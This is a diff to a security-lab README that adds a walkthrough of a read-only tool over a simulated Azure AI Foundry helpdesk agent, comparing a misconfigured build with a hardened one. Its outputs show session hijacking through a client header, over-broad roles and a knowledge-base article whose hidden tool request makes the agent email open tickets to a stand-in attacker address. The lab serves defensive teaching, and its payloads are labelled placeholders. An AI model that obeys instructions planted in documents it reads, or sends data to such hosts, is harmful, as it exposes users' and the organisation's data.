@@ -58,6 +58,7 @@ cd labs/az14
 | `policy.py` | The deterministic check your agent runs before every tool call (challenge 1) |
 | `memory_guard.py` | What your code allows into long-term memory (challenge 2) |
 | `hunt.py` | Four hunting rules over the traces; `chain()` is challenge 3 |
+| `explore.py` | Step 1b: each Foundry piece on its own (`map`, `token`, `invoke`, `session`, `identity`, `tools`, `policy`, `egress`, `memory`, `sandbox`, `guardrail`, `logs`, `turn`). Read-only: it reads the setup files and asks the twin, nothing else |
 | `contoso/` | Version 1: `deployment.json` (account, registry, hosted agent versions, guardrail, egress), `identity.json` (role assignments, Conditional Access), `toolbox.json`, `memory.json`, `app.json` (the front end) |
 | `fixes/` | The hardened build, same files |
 | `data/directory.json` | Fictional Entra users (bob, dana = helpdesk; alice = HR; carol = contractor), agents, storage, one existing session, one upload |
@@ -103,6 +104,295 @@ are lab shorthand.
 **About the data and safety.** Every injected line is a labelled `[LAB-PLACEHOLDER ...]`, not a working payload; the
 stand-in model reacts to the marker. Outside addresses and hosts use the reserved `.example` domain. Object IDs and the
 SMTP "key" are placeholders. Nothing here contacts Azure. Test 18 checks all of that.
+
+## Step 1b · Before you attack: look at each Foundry piece on its own (about 15 minutes)
+
+New to hosted agents? Do this before Step 1 (lesson 14.8 calls it "Before you start"; lesson 14.0 explains each idea).
+`explore.py` takes Contoso's deployment apart one Foundry piece at a time, in all three setups (`contoso`, `v1.1`,
+`fixes`). Real output below is from a fresh Ubuntu machine (recording run 41615771497).
+
+**What it really runs.** Nothing that changes anything: `explore.py` reads the JSON files in `contoso/`, `fixes/`,
+`data/` and `logs/`, and asks `twin.py` and `policy.py` what Foundry and your agent's code would do. No network, no
+Azure subscription, no model.
+
+**0. Look before you run.** `make -n setup` prints what `make setup` would run, without running it:
+
+```bash
+make -n setup
+make setup
+```
+
+```text
+python3 ../../tools/check_python.py 3.11
+Nothing to install for this lab: Python 3.12 and its standard library are all it needs.
+```
+
+Other labs make a *virtual environment* here (a private folder for that lab's Python packages, so versions don't
+clash; it isn't a security sandbox) and run `pip install`. This lab uses only Python's standard library.
+
+**1. The whole stack in one picture.** One row per Foundry piece, what it's for, and what the setup has:
+
+```bash
+python3 explore.py map contoso
+```
+
+```output
+  piece             its job                                          what this setup has
+  Hosted agent      your code in a container; a sandbox per session  helpdesk-agent:1.0, 1 vCPU / 2Gi, idle timeout 240 min
+  Endpoint access   who may call the agent                           group:all-staff on Foundry account contoso-ai (every project
+                                                                     and agent in it)
+  Sessions          whose conversation a call resumes                x-ms-user-identity from request header
+  Agent identity    what the agent itself may touch                  Storage Blob Data Contributor on storage account
+                                                                     sthelpdeskcontoso (every container in it)
+  Toolbox           one MCP endpoint for the tools                   helpdesk-tools v1: MCP helpdesk-actions (require_approval
+                                                                     never), Code Interpreter
+  Your runtime      checks your code runs before a tool call         policy check off; approval enforced by nobody; local tools
+                                                                     read_blob, delete_blob, http_get, get_config
+  Egress            where the sandbox may connect                    none
+  Memory (preview)  what the agent remembers, per scope              scope helpdesk-shared; ttl none; write filter off
+  Guardrail         content filter on prompts and answers            names a policy that doesn't exist: filters nothing
+  Tracing           the record of what happened                      Application Insights on; readers group:all-staff
+```
+
+Run `python3 explore.py map fixes` too: agent-scope Foundry Agent Consumer, the user from the validated token, Storage
+Blob Data Reader on container `kb` only, toolbox v2 with `require_approval always`, your policy check on, egress
+`Enforced` with default Deny, memory scope `{{$userId}}` with a TTL, a guardrail that exists, trace readers
+`group:helpdesk-security`.
+
+**2. The token (lesson 14.3).** What Microsoft Entra ID puts in Bob's access token (values are the lab's):
+
+```bash
+python3 explore.py token bob
+```
+
+```output
+  iss                https://login.microsoftonline.com/<tenant-id>/v2.0   issuer: who signed it (Contoso's tenant)
+  aud                api://helpdesk-web                                   audience: which API the token is for; check it
+  tid                <tenant-id>                                          tenant ID: which organisation the user signed in to
+  oid                lab-oid-bob-0001                                     object ID: the user's fixed ID in this tenant (use this one)
+  preferred_username bob@contoso.com                                      display only: Microsoft says it can change
+  scp                Helpdesk.Chat                                        what the front end may do for the user
+  groups             helpdesk-staff, all-staff                            group memberships (names here; real tokens carry IDs)
+
+=> Your front end validates this token. The oid in it is what x-ms-user-identity should carry (step 4).
+```
+
+**3. Who may call which agent (lesson 14.3).** The Foundry Agent Consumer assignments, and whether one covers the
+agent Carol calls:
+
+```bash
+python3 explore.py invoke contoso carol helpdesk-admin-agent
+python3 explore.py invoke fixes carol helpdesk-admin-agent
+```
+
+```output
+  Foundry Agent Consumer role assignments:
+    group:all-staff        on Foundry account contoso-ai (every project and agent in it) applies: covers this agent
+
+=> 200: the call goes through
+   A role at account or project scope covers EVERY agent below it, admin agents included.
+...
+  Foundry Agent Consumer role assignments:
+    group:all-staff        on agent helpdesk-agent                         your group, but not this agent
+    group:helpdesk-leads   on agent helpdesk-admin-agent                   not you
+    app:helpdesk-web       on agent helpdesk-agent                         not you
+
+=> 403: no Foundry Agent Consumer role covers this agent
+```
+
+**4. Whose session (lesson 14.2).** Bob signs in; his browser says he is Alice:
+
+```bash
+python3 explore.py session contoso bob --header alice
+python3 explore.py session fixes bob --header alice
+```
+
+```output
+  signed in (validated Entra token)   bob  (oid lab-oid-bob-0001)
+  the browser also sent                user = alice
+  this front end takes the user from   request header  (whatever the browser says)
+  x-ms-user-identity sent to Foundry   lab-oid-alice-0003  (alice)
+  sessions this request can resume     1
+      Alice's draft: L4 pay band uplift CANARY-AZ14-PAY-5521 (HR only)
+
+=> Foundry treats x-ms-user-identity as an opaque string and scopes the session to it.
+   bob is now in alice's session. Microsoft: derive it server-side, never from the client.
+...
+  this front end takes the user from   validated token  (the browser can't change it)
+  x-ms-user-identity sent to Foundry   lab-oid-bob-0001  (bob)
+  sessions this request can resume     0
+```
+
+**5. What the agent identity can touch (lesson 14.3).**
+
+```bash
+python3 explore.py identity contoso
+python3 explore.py identity fixes
+```
+
+```output
+  Storage Blob Data Contributor  on storage account sthelpdeskcontoso (every container in it)
+
+  what that lets the agent do in storage account sthelpdeskcontoso:
+    container kb          read     write/delete
+    container hr-exports  read     write/delete
+...
+  Storage Blob Data Reader       on container kb
+
+  what that lets the agent do in storage account sthelpdeskcontoso:
+    container kb          read     no write
+    container hr-exports  no read  no write
+```
+
+**6. The toolbox (lesson 14.4).** The tools, the approval flag, whose credential each call uses:
+
+```bash
+python3 explore.py tools contoso
+```
+
+```output
+Toolbox helpdesk-tools, default_version 1 (the version the MCP endpoint serves)
+
+  MCP server helpdesk-actions  https://actions.contoso.example/mcp
+    allowed_tools     not set: every tool the server offers
+    require_approval  never  (returned in _meta.tool_configuration on tools/list)
+    connection        actions-admin-key, authType custom-keys: calls run as svc-helpdesk-admin
+  code_interpreter: offered through the toolbox
+
+  tools the model sees this turn:
+    read_blob       read   from local
+    delete_blob     write  from local
+    http_get        read   from local
+    get_config      read   from local
+    search_tickets  read   from toolbox
+    create_ticket   write  from toolbox
+    send_email      write  from toolbox
+    close_ticket    write  from toolbox
+    delete_ticket   write  from toolbox
+
+=> Microsoft: "The MCP endpoint doesn't block tools/call. Enforcement is entirely the agent runtime's
+   responsibility." In a hosted agent the runtime is your code: approval enforced here = NO
+```
+
+**7. What your code checks before a tool call (lesson 14.5).** The same outside email, version 1 and hardened:
+
+```bash
+python3 explore.py policy contoso bob send_email '{"to": "collect@attacker.example"}'
+python3 explore.py policy fixes bob send_email '{"to": "collect@attacker.example"}'
+```
+
+```output
+  tool call   send_email({"to": "collect@attacker.example"})   proposed by the model for bob@contoso.com
+  offered?    yes, a write tool from toolbox
+  1. policy.check (your code, no model)   not called in this setup
+  2. approval                            require_approval never, but this runtime ignores it
+
+=> runs
+...
+  1. policy.check (your code, no model)   DENY: recipient collect@attacker.example is outside contoso.com
+
+=> REFUSED by your policy check
+```
+
+**8. Egress (lesson 14.2).** The rules in order, first match wins, then the mode:
+
+```bash
+python3 explore.py egress v1.1 https://collect.attacker.example/c
+python3 explore.py egress fixes https://collect.attacker.example/c
+```
+
+```output
+  outbound call from the agent's sandbox to host collect.attacker.example
+  egress policy   mode Audit, defaultAction Deny   (preview; in Azure it sits in the RAI policy)
+    rule 1 allow-contoso  host *.contoso.com          Allow  no match
+    rule 2 allow-learn    host learn.microsoft.com    Allow  no match
+    no rule matched: defaultAction Deny
+
+=> Audit mode: would deny, logged, not blocked
+...
+=> HTTP 403 from the egress proxy
+```
+
+**9. Memory and Code Interpreter (lesson 14.6).**
+
+```bash
+python3 explore.py memory contoso bob
+python3 explore.py memory fixes bob
+python3 explore.py sandbox contoso bob
+```
+
+```output
+  memory store helpdesk-memory, tool scope "helpdesk-shared"
+  for bob: memories go under scope helpdesk-shared
+  alice, bob, dana: helpdesk-shared, helpdesk-shared, helpdesk-shared   <- one shared shelf
+...
+  for bob: memories go under scope lab-oid-bob-0001
+  alice, bob, dana: lab-oid-alice-0003, lab-oid-bob-0001, lab-oid-dana-0002   <- one shelf each
+...
+  Code Interpreter in this setup: through the toolbox
+  files uploaded today: payslip-oct.csv (by alice)
+  what bob sees in /mnt/data: 1 file(s)
+      alice,CANARY-AZ14-SLIP-8830
+
+=> Microsoft: through a toolbox in a hosted agent "user isolation isn't supported. All users in the
+   same project share the same container context."
+```
+
+**10. The guardrail and the record (lesson 14.7).**
+
+```bash
+python3 explore.py guardrail contoso
+python3 explore.py logs contoso
+```
+
+```output
+  rai_config.rai_policy_name   .../accounts/contoso-ai/raiPolicies/helpdesk-guardrail-v1
+  RAI policies on the account  Microsoft.DefaultV2, helpdesk-guardrail
+  does the named policy exist? NO
+  a prompt attack at the input  reaches the agent
+
+=> Microsoft: such an agent "is created successfully and reports active, but no content filtering
+   is applied". The agent reports active; nothing is filtered.
+...
+  Application Insights tracing   on
+  who may read the traces        group:all-staff
+  span names                     invoke_agent (one request), execute_tool (one tool call)
+
+  one execute_tool span from the sample day (72 spans and events):
+    time                         2026-10-21T08:06:42Z
+    span                         execute_tool
+    gen_ai.conversation.id       conv-0001
+    tool                         send_email
+    gen_ai.tool.call.arguments   {"to": "bob@contoso.com", "subject": "steps", "body": "see KB"}
+    gen_ai.tool.call.result      sent
+
+=> Tool arguments and results are IN the trace, so the readers list is an access decision.
+```
+
+**11. Read one request from the top.** `explore.py turn` runs one request through the twin, in memory; every line
+starting with a dot is one step:
+
+```bash
+python3 explore.py turn contoso bob "VPN client certificate renewal"
+python3 explore.py turn fixes bob "VPN client certificate renewal"
+```
+
+```output
+Q (bob): VPN client certificate renewal
+   . endpoint: HTTP 200 (Foundry Agent Consumer covers helpdesk-agent)
+   . session and memory for: bob
+   . read KB-1002 from container kb as the agent identity; it hides a tool request (a lab placeholder)
+   . send_email({"to": "collect@attacker.example", "subject": "kb", "body": "open-tickets"}) EXECUTED  [from KB-1002]
+     result: send_email(to=collect@attacker.example, subject=kb, body=open-tickets) done as svc-helpdesk-admin
+A: Certificates renew every 12 months from the Company Portal app. [KB-1002]
+...
+   . send_email({"to": "collect@attacker.example", "subject": "kb", "body": "open-tickets"}) REFUSED by policy.check  [from KB-1002]
+A: Certificates renew every 12 months from the Company Portal app. [KB-1002]
+```
+
+Who may call (the endpoint check), whose session and memory the turn uses, what the agent read as its own identity,
+each tool call and where it came from (`[from KB-1002]`: the article, not Bob), whose credential it ran with, then
+the answer. Bob's answer looks normal in both setups; only the tool line tells you what happened.
 
 ## Step 1 · Review before anyone attacks (`make check`)
 
